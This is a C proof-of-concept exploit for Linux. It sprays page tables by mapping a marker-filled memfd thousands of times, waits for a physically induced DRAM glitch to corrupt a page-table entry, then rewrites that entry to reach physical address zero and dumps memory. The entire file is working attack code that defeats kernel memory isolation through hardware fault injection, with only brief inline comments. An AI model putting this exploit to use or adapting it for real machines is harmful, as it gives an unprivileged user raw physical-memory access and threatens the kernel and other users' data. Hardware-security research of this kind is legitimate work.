#define _GNU_SOURCE 
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <stdint.h>
#include <sys/mman.h>

#define TWO_MB 0x200000
#define MEMFD_SIZE (TWO_MB * 16)

// TODO: size this dynamically based on /proc/meminfo
#define PT_SPRAY_COUNT 0x2000

#define SPRAY_BASE 0xdead0000000

void hexdump(void *addr, size_t len) {
	uint8_t *buf = (uint8_t *)addr;
	for (size_t i = 0; i < len; i += 16) {
		for (size_t j = 0; j < 16 && (i + j < len); j++) {
			printf("%02x", buf[i+j]);
		}
		printf("\n");
	}
}

uint64_t *find_glitched_pte(void)
{
	printf("[*] Searching for bitflipped PTEs\n"); // this is when the physical glitching should start
	for(;;) {
		printf(".");
		fflush(stdout);
		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
				if (*ptr != 0x4141414141414141) {
					printf("\nFAULT!\n");
					//hexdump(ptr, 4096);

					// now we need to inspect the page to see if it looks like one of our pagetables

					// we expect NX bit to be set
					if ((*ptr >> 63) != 1) {
						continue;
					}
					
					// we expect all but the first 64-bit word to be zero
					int success = 1;
					for (size_t k = 1; k < 0x1000 / 8; k++) {
						if (ptr[k]) {
							success = 0;
							break;
						}
					}
					if (success) {
						return ptr;
					}
				}
			}
		}
	}
}

int main()
{
	printf("[*] Setting up memfd\n");

	int memfd = memfd_create("hax", MFD_CLOEXEC);
	if (memfd < 0) {
		perror("memfd_create");
		return -1;
	}

	if(ftruncate(memfd, MEMFD_SIZE) != 0) {
		perror("ftruncate");
		return -1;
	}

	// populate the memfd with recognizeable values
	for (size_t i=0; i < MEMFD_SIZE; i += TWO_MB) {
		assert(lseek(memfd, i, SEEK_SET) >= 0);
		assert(write(memfd, "AAAAAAAABBBBBBBB", 16) == 16);
	}


	printf("[*] Spraying pagetables\n");
	for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
		uint8_t *map_vaddr = (uint8_t*)SPRAY_BASE + i * MEMFD_SIZE;
		uint8_t *mmap_res = mmap(map_vaddr, MEMFD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED_NOREPLACE, memfd, 0);
		assert(mmap_res == map_vaddr);
	}

	/* on success, glitched_pte was glitched during a DRAM read.
	   the actual PTE value in DRAM is unmodified.

	   therefore, it is essential that it doesn't fall out of cache until the exploit is done.
	   we'll re-read it periodically - it's marked "volatile" so the compiler doesn't elide those reads.
	*/
	volatile uint64_t * volatile glitched_pte = find_glitched_pte();
	printf("[+] Found glitched PTE @ %p\n", (void*)glitched_pte);
	printf("[*] PTE value: 0x%016lx\n", *glitched_pte);
	printf("[*] Searching for corresponding mapping...\n");

	*glitched_pte = *glitched_pte & 0x8000000000000fff; // point it at address zero (arbitrary)

	uint64_t foo = 0;

	// loop twice to make sure the tlb/cache gets busted
	for (int k=0; k<2; k++) {
		for (size_t i = 0; i < PT_SPRAY_COUNT; i++) {
			for (size_t j = 0; j < MEMFD_SIZE; j += TWO_MB) {
				uint64_t *ptr = (uint64_t*)(SPRAY_BASE + i * MEMFD_SIZE + j);
				foo += *glitched_pte; // read to keep it in cache?
				if (ptr == glitched_pte) continue;
				if (*ptr != 0x4141414141414141) {
					printf("FAULT!\n");
					printf("0x%016lx\n", ptr);

					hexdump(ptr, 4096);
				}
			}
		}
	}

	printf("[*] PTE value: 0x%016lx\n", *glitched_pte);
	printf("bye %lu\n", foo);
}
